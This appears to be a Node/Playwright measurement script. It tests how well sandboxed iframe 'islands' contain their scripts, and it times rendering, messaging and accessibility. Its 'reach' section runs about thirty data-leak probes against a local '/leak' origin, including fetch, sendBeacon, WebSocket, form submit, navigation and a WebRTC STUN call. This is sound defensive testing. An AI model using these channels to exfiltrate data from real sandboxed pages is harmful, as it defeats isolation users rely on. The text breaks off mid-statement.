#!/usr/bin/env node
// A measurement, not a gate (docs/islands.md): what a sealed island can reach, what a message costs, what the cancho-www hero and cairns cost in a
// sandboxed frame against the page, and how a frame behaves under a page that rebuilds or hydrates. The page is read, never changed: pass the path
// of a cancho-www clone.
//   node scripts/measure-islands.js /path/to/cancho-www [reach|messages|hero|cairns|media|a11y|hydrate|compiled|map ...]
// DESKTOP CHROMIUM with the Pixel 7 profile (a viewport and a user agent) and, where it says so, a 4x CPU throttle: not a device.
'use strict';
const fs = require('fs');
const http = require('http');
const dgram = require('dgram');
const path = require('path');
const zlib = require('zlib');
const { chromium, devices } = require('playwright');

const www = path.resolve(process.argv[2] || '');
if (!fs.existsSync(path.join(www, 'assets', 'scene.js'))) { console.error('usage: node scripts/measure-islands.js <path of a cancho-www clone> [section ..]'); process.exit(2); }
const want = process.argv.slice(3);
const on = (s) => !want.length || want.includes(s);
const watchdog = setTimeout(() => { console.log('FAIL watchdog: 8 minutes'); process.exit(1); }, 8 * 60 * 1000);
const sleep = (ms) => new Promise((ok) => setTimeout(ok, ms));
const read = (f) => fs.readFileSync(path.join(www, f), 'utf8');
const ROCKS = read('assets/rocks.js'), SCENE = read('assets/scene.js'), SITECSS = read('assets/site.css');

// the island's document, as the compiler would write it: the policy first, then the style, then the body, then the scripts
function srcdoc({ csp, css = '', body = '', scripts = [], extra = '' }) {
  return `<!doctype html><html><head><meta charset="utf-8">${csp ? `<meta http-equiv="Content-Security-Policy" content="${csp}">` : ''}<style>${css}</style></head><body>${body}${scripts.map((s) => `<script>${s}</script>`).join('')}${extra}</body></html>`;
}
const attr = (s) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
const CSP_A = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'";
const CSP_B = CSP_A + "; form-action 'none'; base-uri 'none'; frame-src 'none'";

(async () => {
  // two origins: the page's and "somewhere else"; the second logs every request it gets
  const hits = [];
  const other = http.createServer((q, r) => { hits.push(q.url + (q.headers.upgrade ? ' (upgrade)' : '')); r.setHeader('content-type', q.url.includes('mod.js') ? 'text/javascript' : 'text/plain'); r.setHeader('access-control-allow-origin', '*'); r.end(q.url.includes('mod.js') ? 'window.__mod = 1;' : 'ok'); });
  await new Promise((ok) => other.listen(0, ok));
  const pageHits = [];
  let pages = {};
  const site = http.createServer((q, r) => {
    const u = q.url.split('?')[0];
    if (u.startsWith('/leak')) { pageHits.push(q.url); r.end('ok'); return; }
    if (pages[u]) { r.setHeader('content-type', 'text/html'); r.end(pages[u]); return; }
    const f = path.join(www, decodeURIComponent(u));
    fs.readFile(f, (e, d) => { if (e || !fs.statSync(f).isFile()) { r.statusCode = 404; r.end(); return; } r.setHeader('content-type', { '.js': 'text/javascript', '.css': 'text/css', '.html': 'text/html' }[path.extname(f)] || 'application/octet-stream'); r.end(d); });
  });
  await new Promise((ok) => site.listen(0, ok));
  const A = `http://127.0.0.1:${site.address().port}`, B = `http://127.0.0.1:${other.address().port}`;
  const stun = dgram.createSocket('udp4'); const stunHits = [];
  stun.on('message', (m) => stunHits.push(m.length));
  await new Promise((ok) => stun.bind(0, '127.0.0.1', ok));
  const stunPort = stun.address().port;
  const browser = await chromium.launch();
  // no service workers are registered by any page here; 'block' is not used because Playwright's way of blocking them throws in a sandboxed frame
  const newPage = async (opts = {}) => { const ctx = await browser.newContext({ ...devices['Pixel 7'], ...opts }); return { ctx, page: await ctx.newPage() }; };

  // ---------- reach: what an island script can do ----------
  if (on('reach')) {
    const actions = {
      'read parent.document': "try { parent.document.title; return 'reached'; } catch (e) { return e.name; }",
      'read top.location': "try { return 'reached ' + top.location.href; } catch (e) { return e.name; }",
      'localStorage': "try { localStorage.setItem('a', 'b'); return 'reached'; } catch (e) { return e.name; }",
      'document.cookie': "try { document.cookie = 'a=b'; return document.cookie ? 'reached' : 'no cookie kept'; } catch (e) { return e.name; }",
      'indexedDB': "try { var r = indexedDB.open('x'); return await new Promise(function (ok) { r.onsuccess = function () { ok('reached'); }; r.onerror = function () { ok('error ' + (r.error && r.error.name)); }; setTimeout(function () { ok('no answer'); }, 500); }); } catch (e) { return e.name; }",
      'fetch to another origin': "try { await fetch(B + '/leak?fetch', { mode: 'no-cors' }); return 'sent'; } catch (e) { return e.name; }",
      'fetch to the page origin': "try { await fetch(A + '/leak?fetchA', { mode: 'no-cors' }); return 'sent'; } catch (e) { return e.name; }",
      'XMLHttpRequest': "try { var x = new XMLHttpRequest(); x.open('GET', B + '/leak?xhr'); x.send(); await new Promise(function (ok) { x.onloadend = ok; setTimeout(ok, 400); }); return x.status ? 'answered' : 'blocked'; } catch (e) { return e.name; }",
      'new Image().src': "var i = new Image(); i.src = B + '/leak?img'; await new Promise(function (ok) { setTimeout(ok, 400); }); return 'tried';",
      'sendBeacon': "try { return navigator.sendBeacon(B + '/leak?beacon', 'x') ? 'queued' : 'refused'; } catch (e) { return e.name; }",
      'WebSocket': "try { var w = new WebSocket('ws://' + B.slice(7) + '/leak?ws'); await new Promise(function (ok) { w.onerror = ok; w.onopen = ok; setTimeout(ok, 400); }); return 'tried'; } catch (e) { return e.name; }",
      'EventSource': "try { var s = new EventSource(B + '/leak?es'); await new Promise(function (ok) { s.onerror = ok; s.onopen = ok; setTimeout(ok, 400); }); s.close(); return 'tried'; } catch (e) { return e.name; }",
      '<link rel=stylesheet>': "var l = document.createElement('link'); l.rel = 'stylesheet'; l.href = B + '/leak?css-link'; document.head.appendChild(l); await new Promise(function (ok) { setTimeout(ok, 400); }); return 'tried';",
      'CSS url() in a style': "var d = document.createElement('div'); d.style.cssText = 'width:9px;height:9px;background:url(' + B + '/leak?css-url)'; document.body.appendChild(d); await new Promise(function (ok) { setTimeout(ok, 400); }); return 'tried';",
      '<script src>': "var s = document.createElement('script'); s.src = B + '/leak?script-src'; document.head.appendChild(s); await new Promise(function (ok) { setTimeout(ok, 400); }); return 'tried';",
      'import()': "try { await import(B + '/mod.js'); return 'reached'; } catch (e) { return e.name; }",
      'nested <iframe src>': "var f = document.createElement('iframe'); f.src = B + '/leak?iframe'; document.body.appendChild(f); await new Promise(function (ok) { setTimeout(ok, 500); }); return 'tried';",
      '<form> submit': "var f = document.createElement('form'); f.method = 'post'; f.action = B + '/leak?form'; document.body.appendChild(f); try { f.submit(); } catch (e) { return e.name; } await new Promise(function (ok) { setTimeout(ok, 500); }); return 'tried';",
      'window.open': "var w = window.open(B + '/leak?open'); await new Promise(function (ok) { setTimeout(ok, 400); }); return w ? 'opened' : 'null';",
      'location.href = other origin (the frame itself)': "setTimeout(function () { location.href = B + '/leak?selfnav'; }, 10); return 'tried';",
      '<a target=_top> click': "var a = document.createElement('a'); a.href = B + '/leak?top'; a.target = '_top'; document.body.appendChild(a); a.click(); await new Promise(function (ok) { setTimeout(ok, 500); }); return 'tried';",
      'eval / new Function': "try { return String(eval('1+1')); } catch (e) { return e.name; }",
      'Worker from a blob': "try { var w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)']))); return await new Promise(function (ok) { w.onmessage = function () { ok('ran'); }; w.onerror = function () { ok('error'); }; setTimeout(function () { ok('no answer'); }, 400); }); } catch (e) { return e.name; }",
      'serviceWorker.register': "try { await navigator.serviceWorker.register('/sw.js'); return 'registered'; } catch (e) { return e.name; }",
      'clipboard.writeText': "try { await navigator.clipboard.writeText('x'); return 'written'; } catch (e) { return e.name; }",
      '<meta http-equiv=refresh>': "var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + B + '/leak?meta'; document.head.appendChild(m); await new Promise(function (ok) { setTimeout(ok, 600); }); return 'tried';",
      '<link rel=prefetch>': "var l = document.createElement('link'); l.rel = 'prefetch'; l.href = B + '/leak?prefetch'; document.head.appendChild(l); await new Promise(function (ok) { setTimeout(ok, 500); }); return 'tried';",
      '<object data>': "var o = document.createElement('object'); o.data = B + '/leak?object'; document.body.appendChild(o); await new Promise(function (ok) { setTimeout(ok, 500); }); return 'tried';",
      'RTCPeerConnection to a STUN server': "try { var p = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:' + STUN }] }); p.createDataChannel('x'); await p.setLocalDescription(await p.createOffer()); await new Promise(function (ok) { setTimeout(ok, 1200); }); return 'tried'; } catch (e) { return e.name; }",
      'postMessage to the parent': "parent.postMessage({ hello: 1 }, '*'); return 'sent';",
    };
    const names = Object.keys(actions);
    const results = {};
    // the shim the compiler would write before the island's own script: the constructors that CSP does not govern are removed
    const SHIM = "['RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCDataChannel'].forEach(function (k) { try { Object.defineProperty(window, k, { value: undefined, configurable: false, writable: false }); } catch (e) {} });";
    for (const [label, csp, parentCsp, shim] of [
      ['(1) the CSP of www.md section 6', CSP_A, '', ''],
      ['(2) (1) + `form-action \'none\'; base-uri \'none\'; frame-src \'none\'` in the frame', CSP_B, '', ''],
      ['(3) (1) + the page\'s own CSP `frame-src about:`', CSP_A, 'frame-src about:', ''],
      ['(4) (2) + (3) + the shim that removes `RTCPeerConnection`', CSP_B, 'frame-src about:', SHIM],
    ]) {
      const rows = [];
      for (const name of names) {
        hits.length = 0; pageHits.length = 0; stunHits.length = 0;
        const { ctx, page } = await newPage();
        const code = `(async function () { var A = ${JSON.stringify(A)}, B = ${JSON.stringify(B)}, STUN = ${stunPort}; ${actions[name].replace(/^\s*/, '')} })().then(function (r) { parent.postMessage({ done: ${JSON.stringify(name)}, r: String(r) }, '*'); }, function (e) { parent.postMessage({ done: ${JSON.stringify(name)}, r: 'threw ' + e }, '*'); });`;
        const doc = srcdoc({ csp, scripts: [shim + code] });
        pages['/p'] = `<!doctype html><html><head>${parentCsp ? `<meta http-equiv="Content-Security-Policy" content="${parentCsp}">` : ''}</head><body><iframe sandbox="allow-scripts" srcdoc="${attr(doc)}" width="100" height="100"></iframe><script>window.__got = null; addEventListener('message', function (e) { if (e.data && e.data.done) { window.__got = e.data; } });</script></body></html>`;
        await page.goto(`${A}/p`);
        await page.waitForFunction(() => window.__got, null, { timeout: 8000 }).catch(() => {});
        await sleep(300);
        const got = await page.evaluate(() => window.__got);
        rows.push({ name, said: got ? got.r : 'no answer', other: hits.slice(), page: pageHits.slice(), stun: stunHits.length });
        await ctx.close();
      }
      results[label] = rows;
    }
    console.log('\n## reach: an island script in `<iframe sandbox="allow-scripts" srcdoc>` tries each thing; "other" is what a second origin received, "page" what the page\'s own origin received\n');
    console.log('| action | ' + Object.keys(results).map((k) => `with ${k}: said / a request arrived`).join(' | ') + ' |');
    console.log('|---|' + Object.keys(results).map(() => '---|').join(''));
    names.forEach((n, i) => {
      const cells = Object.values(results).map((rows) => { const r = rows[i]; const reached = r.other.length ? `**${r.other.length} request(s) at the other origin**` : (r.page.length ? `**${r.page.length} at the page origin**` : (r.stun ? `**${r.stun} STUN packet(s)**` : 'none arrived')); return `${r.said} / ${reached}`; });
      console.log(`| ${n} | ${cells.join(' | ')} |`);
    });
  }

  // ---------- messages: the cost of crossing the frame ----------
  if (on('messages')) {
    const doc = srcdoc({ csp: CSP_A, scripts: ["addEventListener('message', function (e) { parent.postMessage(e.data, '*'); });"] });
    pages['/m'] = `<!doctype html><html><body><iframe id="f" sandbox="allow-scripts" srcdoc="${attr(doc)}"></iframe></body></html>`;
    console.log('\n## messages: round trips page -> sandboxed frame -> page (the frame echoes), 500 one after another; and 2,000 posted at once\n');
    console.log('| CPU | payload | round trip p50 | p95 | max | 2,000 posted at once: all echoed in |');
    console.log('|---|---|---:|---:|---:|---:|');
    for (const throttle of [1, 4]) {
      for (const size of [16, 1024, 102400]) {
        const { ctx, page } = await newPage();
        const cdp = await ctx.newCDPSession(page);
        await page.goto(`${A}/m`);
        await sleep(300);
        if (throttle > 1) { await cdp.send('Emulation.setCPUThrottlingRate', { rate: throttle }); }
        const r = await page.evaluate(async (size) => {
          const w = document.getElementById('f').contentWindow, payload = 'x'.repeat(size);
          const rtt = [];
          for (let i = 0; i < 500; i++) {
            const t = performance.now();
            await new Promise((ok) => { const h = (e) => { removeEventListener('message', h); ok(); }; addEventListener('message', h); w.postMessage({ i, payload }, '*'); });
            rtt.push(performance.now() - t);
          }
          rtt.sort((a, b) => a - b);
          const N = 2000;
          const t0 = performance.now();
          await new Promise((ok) => { let n = 0; const h = () => { if (++n === N) { removeEventListener('message', h); ok(); } }; addEventListener('message', h); for (let i = 0; i < N; i++) { w.postMessage({ i, payload }, '*'); } });
          return { p50: rtt[250], p95: rtt[475], max: rtt[499], burst: performance.now() - t0, N };
        }, size);
        console.log(`| ${throttle}x | ${size} B | ${r.p50.toFixed(2)} ms | ${r.p95.toFixed(2)} ms | ${r.max.toFixed(1)} ms | ${r.burst.toFixed(0)} ms for ${r.N.toLocaleString()} |`);
        await ctx.close();
      }
    }
  }

  // ---------- spin: what the sandbox does not bound ----------
  if (on('spin')) {
    console.log('\n## spin: a sealed island that loops for 2 s (the sandbox bounds what an island can reach, not how long it runs)\n');
    console.log('| the island | longest gap between two frames of the page |\n|---|---:|');
    for (const [label, body] of [['idle', ''], ['`while (Date.now() < t + 2000) {}`', 'var t = Date.now(); while (Date.now() < t + 2000) {}']]) {
      const { ctx, page } = await newPage();
      pages['/s'] = `<!doctype html><html><body><button id="b" onclick="window.__clicked = performance.now()">x</button><iframe sandbox="allow-scripts" srcdoc="${attr(srcdoc({ csp: CSP_B, scripts: ['setTimeout(function () {' + body + '}, 300);'] }))}"></iframe></body></html>`;
      await page.goto(`${A}/s`);
      const r = await page.evaluate(() => new Promise((ok) => { let last = performance.now(), worst = 0, clicked = 0; const end = last + 3200; setTimeout(() => { window.__t = performance.now(); document.getElementById('b').click(); }, 1000); (function tick(t) { worst = Math.max(worst, t - last); last = t; if (t < end) { requestAnimationFrame(tick); } else { ok({ worst, click: window.__clicked ? window.__clicked - window.__t : -1 }); } })(last); }));
      console.log(`| ${label} | ${r.worst.toFixed(0)} ms |`);
      await ctx.close();
    }
  }

  // the stylesheet rules the hero and the cairns need: taken out of site.css by the browser's own parser
  async function islandCss(page) {
    return page.evaluate((css) => {
      const sheet = new CSSStyleSheet(); sheet.replaceSync(css);
      const keep = /\.(rock|shrub|scene|layer|sun|ridge|ground|pine|cloud|bird|drop|cairn|defs)|^:root|^\.rock/;
      const out = [];
      for (const r of sheet.cssRules) {
        if (r.type === CSSRule.KEYFRAMES_RULE && /sunrise|breathe|drift|glide|settle/.test(r.name)) { out.push(r.cssText); }
        else if (r.type === CSSRule.STYLE_RULE && (r.selectorText === ':root' || keep.test(r.selectorText))) { out.push(r.cssText); }
        else if (r.type === CSSRule.MEDIA_RULE) {
          const inner = [...r.cssRules].filter((x) => (x.type === CSSRule.STYLE_RULE && (x.selectorText === ':root' || keep.test(x.selectorText))) || (x.type === CSSRule.KEYFRAMES_RULE && /sunrise|breathe|drift|glide|settle/.test(x.name))).map((x) => x.cssText);
          if (inner.length) { out.push(`@media ${r.conditionText} { ${inner.join(' ')} }`); }
        }
      }
      return out.join('\n');
    }, SITECSS);
  }

  const HERO_BODY = '<div class="scene"><svg id="scene-svg" viewBox="0 0 640 600" preserveAspectRatio="xMidYMax meet"></svg></div>';
  // what the page's hero() does, as the island's own entry: draw, and take the pointer as a message instead of a window event
  const HERO_GLUE = `(function () { var svg = document.getElementById('scene-svg'); var t0 = performance.now(); window.Scene.draw(svg); window.__drawMs = performance.now() - t0; var reduced = matchMedia('(prefers-reduced-motion: reduce)').matches; window.__drawn = window.__drawMs; svg.querySelectorAll('.layer').forEach(function (l) { l.style.setProperty('--px', 0); }); if (!reduced) { addEventListener('message', function (e) { if (e.data && e.data.pointer) { svg.style.setProperty('--px', e.data.pointer.x.toFixed(3)); svg.style.setProperty('--py', e.data.pointer.y.toFixed(3)); parent.postMessage({ ack: e.data.n }, '*'); } }); } parent.postMessage({ drawn: window.__drawMs, nodes: document.querySelectorAll('*').length }, '*'); })();`;

  // ---------- hero: inline against sealed ----------
  if (on('hero')) {
    console.log('\n## hero: the cancho-www scene (rocks.js + scene.js unchanged + the rules of site.css it uses), inline in the page and in a sealed frame; 4x CPU throttle, 3 s of animation\n');
    console.log('| where | draw (ms) | frames in 3 s (page main thread) | p50 frame | p95 frame | frames over 50 ms | nodes in the page | nodes in the frame | island css |');
    console.log('|---|---:|---:|---:|---:|---:|---:|---:|---:|');
    for (const where of ['inline', 'sealed frame']) {
      const { ctx, page } = await newPage({ viewport: { width: 412, height: 800 } });
      const cdp = await ctx.newCDPSession(page);
      await page.goto(`${A}/assets/rocks.js`).catch(() => {});
      const css = await islandCss(page);
      const wrap = `<div style="width:100%;max-width:30rem;margin:0 auto">`;
      pages['/h'] = where === 'inline'
        ? `<!doctype html><html><head><meta charset="utf-8"><style>${css}</style></head><body>${wrap}${HERO_BODY}</div><script>${ROCKS}</script><script>${SCENE}</script><script>${HERO_GLUE.replace("parent.postMessage({ drawn: window.__drawMs, nodes: document.querySelectorAll('*').length }, '*');", '')}</script></body></html>`
        : `<!doctype html><html><head><meta charset="utf-8"><script>addEventListener('message', function (e) { if (e.data && e.data.drawn !== undefined) { window.__drawn = e.data; } });</script></head><body>${wrap}<iframe id="f" sandbox="allow-scripts" title="hero" aria-hidden="true" style="border:0;width:100%;aspect-ratio:640/600;display:block" srcdoc="${attr(srcdoc({ csp: CSP_B, css, body: HERO_BODY, scripts: [ROCKS, SCENE, HERO_GLUE] }))}"></iframe></div></body></html>`;
      await cdp.send('Emulation.setCPUThrottlingRate', { rate: 4 });
      const t0 = Date.now();
      await page.goto(`${A}/h`);
      await page.waitForFunction(() => window.__drawn || document.querySelector('#scene-svg .layer'), null, { timeout: 20000 });
      const drawMs = await page.evaluate(() => (typeof window.__drawn === 'number' ? window.__drawn : (window.__drawn && window.__drawn.drawn)) || 0);
      const frames = await page.evaluate(() => new Promise((ok) => { const d = []; let last = performance.now(); const end = last + 3000; (function tick(t) { d.push(t - last); last = t; if (t < end) { requestAnimationFrame(tick); } else { ok(d.slice(1)); } })(last); requestAnimationFrame((t) => {}); }));
      frames.sort((a, b) => a - b);
      const nodes = await page.evaluate(() => document.querySelectorAll('*').length);
      const frameNodes = where === 'inline' ? 0 : await page.frames()[1].evaluate(() => document.querySelectorAll('*').length);
      console.log(`| ${where} | ${drawMs ? drawMs.toFixed(0) : '(see load)'} | ${frames.length} | ${frames[Math.floor(frames.length / 2)].toFixed(1)} ms | ${frames[Math.floor(frames.length * 0.95)].toFixed(1)} ms | ${frames.filter((x) => x > 50).length} | ${nodes} | ${frameNodes} | ${css.length.toLocaleString()} B |`);
      await ctx.close();
    }
  }

  // ---------- media: does the user's scheme and motion preference reach a sealed frame? ----------
  if (on('media')) {
    console.log('\n## media: `prefers-color-scheme` and `prefers-reduced-motion` inside a sandboxed srcdoc frame, with the page emulating each\n');
    console.log('| the page is given | the frame says: dark | reduced motion | its `--accent` |');
    console.log('|---|---|---|---|');
    for (const [scheme, motion] of [['light', 'no-preference'], ['dark', 'reduce']]) {
      const { ctx, page } = await newPage({ colorScheme: scheme, reducedMotion: motion });
      const doc = srcdoc({ csp: CSP_A, css: ':root{--accent:#185fa5} @media (prefers-color-scheme: dark){:root{--accent:#6ea3ee}}', scripts: ["parent.postMessage({ media: [matchMedia('(prefers-color-scheme: dark)').matches, matchMedia('(prefers-reduced-motion: reduce)').matches, getComputedStyle(document.documentElement).getPropertyValue('--accent')] }, '*');"] });
      pages['/c'] = `<!doctype html><html><body><iframe sandbox="allow-scripts" srcdoc="${attr(doc)}"></iframe><script>addEventListener('message', function (e) { if (e.data && e.data.media) { window.__m = e.data.media; } });</script></body></html>`;
      await page.goto(`${A}/c`);
      await page.waitForFunction(() => window.__m, null, { timeout: 5000 });
      const m = await page.evaluate(() => window.__m);
      console.log(`| ${scheme}, ${motion} | ${m[0]} | ${m[1]} | ${m[2]} |`);
      await ctx.close();
    }
  }

  // ---------- cairns: eleven small frames ----------
  if (on('cairns')) {
    const CAIRN_GLUE = `(function () { var R = window.Rocks, el = R.el; var svg = el('svg', { viewBox: '0 0 84 58', 'aria-hidden': 'true' }, document.getElementById('c')); [[42, 58, 32, 14, 3], [44, 38, 22, 11, 4], [41, 21, 13, 8, 5]].forEach(function (s, i) { var g = el('g', { class: 'st' }, svg); R.rock(g, { seed: 'cairn' + ${'${N}'} + i, x: s[0], baseY: s[1], rx: s[2], ry: s[3], n: 9, cracks: 0, lichen: 0, jitter: 0.12 }); }); var io = new IntersectionObserver(function (es) { es.forEach(function (e) { if (e.isIntersecting) { document.getElementById('c').classList.add('in'); parent.postMessage({ cairn: ${'${N}'}, seen: true }, '*'); io.disconnect(); } }); }, { threshold: 0.25 }); io.observe(document.getElementById('c')); parent.postMessage({ cairn: ${'${N}'}, drawn: true }, '*'); })();`;
    console.log('\n## cairns: the page has 11 `.cairn` dividers (3 rocks each, drawn by rocks.js, revealed by an IntersectionObserver); inline, and as 11 sealed frames; 4x CPU throttle\n');
    console.log('| where | time to draw all 11 | drawn | bytes of HTML | gzip of that | documents | revealed at load, below the fold | after scrolling to the last |');
    console.log('|---|---:|---|---:|---:|---:|---|---|');
    for (const where of ['inline', '11 sealed frames']) {
      const { ctx, page } = await newPage({ viewport: { width: 412, height: 700 } });
      const cdp = await ctx.newCDPSession(page);
      await page.goto(`${A}/assets/rocks.js`).catch(() => {});
      const css = (await islandCss(page)) + '.cairn svg{width:5.2rem;height:3.6rem;overflow:visible}';
      const spacer = '<div style="height:900px"></div>';
      let html;
      if (where === 'inline') {
        const cairns = Array.from({ length: 11 }, (_, n) => `${spacer}<div class="cairn" id="c${n}" aria-hidden="true"></div>`).join('');
        html = `<!doctype html><html><head><meta charset="utf-8"><style>${css}</style></head><body>${cairns}<script>${ROCKS}</script><script>window.__t0 = performance.now(); document.querySelectorAll('.cairn').forEach(function (c, n) { var R = window.Rocks, el = R.el; var svg = el('svg', { viewBox: '0 0 84 58', 'aria-hidden': 'true' }, c); [[42, 58, 32, 14, 3], [44, 38, 22, 11, 4], [41, 21, 13, 8, 5]].forEach(function (s, i) { var g = el('g', { class: 'st' }, svg); R.rock(g, { seed: 'cairn' + n + i, x: s[0], baseY: s[1], rx: s[2], ry: s[3], n: 9, cracks: 0, lichen: 0, jitter: 0.12 }); }); }); window.__ms = performance.now() - window.__t0; window.__seen = 0; var io = new IntersectionObserver(function (es) { es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); window.__seen++; io.unobserve(e.target); } }); }, { threshold: 0.25 }); document.querySelectorAll('.cairn').forEach(function (c) { io.observe(c); }); </script></body></html>`;
      } else {
        const frames = Array.from({ length: 11 }, (_, n) => `${spacer}<iframe class="cf" sandbox="allow-scripts" title="" aria-hidden="true" style="border:0;width:5.2rem;height:3.6rem;display:block;margin:0 auto" srcdoc="${attr(srcdoc({ csp: CSP_B, css: css + ' body{margin:0} .cairn{margin:0}', body: '<div class="cairn" id="c"></div>', scripts: [ROCKS, CAIRN_GLUE.replace(/\$\{N\}/g, String(n))] }))}"></iframe>`).join('');
        // the listener is in the head: a frame near the top posts before the end of the body has been parsed
        html = `<!doctype html><html><head><meta charset="utf-8"><script>window.__t0 = performance.now(); window.__drawn = 0; window.__seen = 0; window.__which = []; addEventListener('message', function (e) { if (e.data && e.data.drawn) { window.__which.push(e.data.cairn); } if (e.data && e.data.drawn && ++window.__drawn === 11) { window.__ms = performance.now() - window.__t0; } if (e.data && e.data.seen) { window.__seen++; } });</script></head><body>${frames}</body></html>`;
      }
      pages['/k'] = html;
      page.on('console', (m) => { if (m.type() === 'error') { console.log('  [console]', m.text().slice(0, 200)); } });
      page.on('pageerror', (e) => console.log('  [pageerror]', String(e).slice(0, 200)));
      await cdp.send('Emulation.setCPUThrottlingRate', { rate: Number(process.env.THROTTLE || 4) });
      await page.goto(`${A}/k`);
      await page.waitForFunction(() => window.__ms, null, { timeout: 60000 }).catch(async () => { console.log('  [debug] drawn:', await page.evaluate(() => window.__which.join(',') + ' | ' + window.__drawn)); throw new Error('not all drawn'); });
      const atLoad = await page.evaluate(() => (typeof window.__drawn === 'number' ? window.__drawn : 11));
      const ms0 = await page.evaluate(() => window.__ms || -1);
      const seen0 = await page.evaluate(() => window.__seen);
      for (let y = 0; y <= 11 * 1100; y += 500) { await page.evaluate((y) => window.scrollTo(0, y), y); await sleep(120); }
      await sleep(1200);
      const seen1 = await page.evaluate(() => window.__seen);
      const drawnAll = await page.evaluate(() => (typeof window.__drawn === 'number' ? window.__drawn : 11));
      console.log(`| ${where} | ${ms0 >= 0 ? ms0.toFixed(0) + ' ms' : 'not all at load'} | ${atLoad} of 11 at load, ${drawnAll} after scrolling | ${html.length.toLocaleString()} | ${zlib.gzipSync(html).length.toLocaleString()} | ${page.frames().length} | ${seen0} of 11 | ${seen1} of 11 |`);
      await ctx.close();
    }
  }

  // ---------- pointer: forwarding the pointer into a sealed frame ----------
  if (on('pointer')) {
    console.log('\n## pointer: 180 `pointermove` events at 60 Hz (3 s) forwarded to the sealed hero, which sets `--px` and acknowledges; 4x CPU throttle; three ways to forward\n');
    console.log('| forwarding | messages sent | acknowledged | round trip p50 | p95 | page frame p50 | p95 | page frames over 50 ms |');
    console.log('|---|---:|---:|---:|---:|---:|---:|---:|');
    for (const mode of ['every event', 'at most one per animation frame', 'at most 20 a second']) {
      const { ctx, page } = await newPage({ viewport: { width: 412, height: 800 } });
      const cdp = await ctx.newCDPSession(page);
      await page.goto(`${A}/assets/rocks.js`).catch(() => {});
      const css = await islandCss(page);
      pages['/hp'] = `<!doctype html><html><head><meta charset="utf-8"><script>window.__acks = {}; addEventListener('message', function (e) { if (e.data && typeof e.data.ack === 'number') { window.__acks[e.data.ack] = performance.now(); } });</script></head><body><iframe id="f" sandbox="allow-scripts" title="hero" aria-hidden="true" style="border:0;width:100%;aspect-ratio:640/600;display:block" srcdoc="${attr(srcdoc({ csp: CSP_B, css, body: HERO_BODY, scripts: [ROCKS, SCENE, HERO_GLUE] }))}"></iframe></body></html>`;
      await cdp.send('Emulation.setCPUThrottlingRate', { rate: 4 });
      await page.goto(`${A}/hp`);
      await sleep(1500);
      const r = await page.evaluate((mode) => new Promise((ok) => {
        const w = document.getElementById('f').contentWindow, sent = {}, d = []; let n = 0, k = 0, last = performance.now(), pending = null, lastSend = 0;
        const end = last + 3000;
        const post = (v) => { const t = performance.now(); sent[k] = t; w.postMessage({ n: k, pointer: v }, '*'); k++; };
        const timer = setInterval(() => {
          const v = { x: Math.sin(n / 20), y: Math.cos(n / 30) }; n++;
          if (mode === 'every event') { post(v); }
          else if (mode.startsWith('at most one per')) { pending = v; }
          else if (performance.now() - lastSend >= 50) { lastSend = performance.now(); post(v); }
          if (n >= 180) { clearInterval(timer); }
        }, 1000 / 60);
        (function tick(t) { d.push(t - last); last = t; if (pending) { post(pending); pending = null; } if (t < end) { requestAnimationFrame(tick); } else { setTimeout(() => { const lat = Object.keys(window.__acks).map((q) => window.__acks[q] - sent[q]).filter((x) => x >= 0).sort((a, b) => a - b); ok({ sent: k, lat, frames: d.slice(1).sort((a, b) => a - b) }); }, 600); } })(last);
      }), mode);
      const pct = (a, p) => (a.length ? a[Math.min(a.length - 1, Math.floor(a.length * p))] : NaN);
      console.log(`| ${mode} | ${r.sent} | ${r.lat.length} | ${pct(r.lat, 0.5).toFixed(1)} ms | ${pct(r.lat, 0.95).toFixed(1)} ms | ${pct(r.frames, 0.5).toFixed(1)} ms | ${pct(r.frames, 0.95).toFixed(1)} ms | ${r.frames.filter((x) => x > 50).length} |`);
      await ctx.close();
    }
  }

  // ---------- accessibility ----------
  if (on('a11y')) {
    console.log('\n## a11y: the accessibility tree of the page with the hero frame, with and without `aria-hidden` on the iframe\n');
    console.log('| iframe | nodes in the tree |\n|---|---:|');
    for (const [label, extra] of [['`title` only', 'title="A stack of granite boulders"'], ['`title` and `aria-hidden="true"` (decorative: true)', 'title="A stack of granite boulders" aria-hidden="true"'], ['`role="img"` and `aria-label`, no title', 'role="img" aria-label="A stack of granite boulders"']]) {
      const { ctx, page } = await newPage();
      await page.goto(`${A}/assets/rocks.js`).catch(() => {});
      const css = await islandCss(page);
      pages['/a'] = `<!doctype html><html><body><main><h1>x</h1><iframe sandbox="allow-scripts" ${extra} style="border:0;width:300px;height:280px" srcdoc="${attr(srcdoc({ csp: CSP_B, css, body: HERO_BODY, scripts: [ROCKS, SCENE, HERO_GLUE] }))}"></iframe></main></body></html>`;
      await page.goto(`${A}/a`);
      await sleep(800);
      const cdp = await ctx.newCDPSession(page);
      const n = (await cdp.send('Accessibility.getFullAXTree')).nodes.filter((x) => !x.ignored).length;
      // the frame's own tree is a separate target in a cross-origin frame; ask it too
      let inner = 0;
      for (const f of page.frames().slice(1)) { try { const c2 = await ctx.newCDPSession(f); inner += (await c2.send('Accessibility.getFullAXTree')).nodes.filter((x) => !x.ignored).length; } catch (e) { inner = -1; } }
      console.log(`| ${label} | page ${n}, frame ${inner < 0 ? '(not asked)' : inner} |`);
      await ctx.close();
    }
  }

  // ---------- hydrate: a frame in a page that rebuilds, and in one that hydrates ----------
  if (on('hydrate')) {
    console.log('\n## hydrate: a sealed island is an iframe in the static skeleton; the page\'s script then renders three times\n');
    console.log('| the page\'s script | iframe `load` events | the iframe is the same node after | the island restarted (its own clock) |');
    console.log('|---|---:|---|---|');
    for (const mode of ['P1a: empties #root and rebuilds', 'P1b: fills only the holes']) {
      const { ctx, page } = await newPage();
      const island = srcdoc({ csp: CSP_A, scripts: ["parent.postMessage({ started: Date.now() }, '*');"] });
      const iframe = `<iframe id="island" sandbox="allow-scripts" title="x" srcdoc="${attr(island)}"></iframe>`;
      const skeleton = `<p>static</p>${iframe}<!--cui:0--><!--/cui:0-->`;
      const script = mode.startsWith('P1a')
